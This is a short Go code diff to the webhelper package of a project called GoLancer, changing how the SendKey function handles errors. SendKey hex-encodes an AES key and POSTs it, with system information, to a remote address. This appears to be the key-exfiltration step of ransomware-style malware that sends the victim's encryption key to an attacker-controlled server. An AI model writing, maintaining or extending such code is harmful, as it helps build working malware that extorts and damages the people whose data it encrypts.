@@ -3,14 +3,13 @@ package webhelper
 import (
 	"encoding/hex"
 	"fmt"
-	"log"
 	"net/http"
 	"net/url"
 
 	"github.com/WesEfird/GoLancer/sysinfo"
 )
 
-func SendKey(aesKey []byte, addr string) {
+func SendKey(aesKey []byte, addr string) error {
 	encodedBytes := hex.EncodeToString(aesKey)
 
 	data := url.Values{
@@ -20,9 +19,10 @@ func SendKey(aesKey []byte, addr string) {
 
 	resp, err := http.PostForm(addr, data)
 	if err != nil {
-		log.Println(err)
+		return err
 	}
 
 	fmt.Println(resp.Status)
 
+	return nil
 }
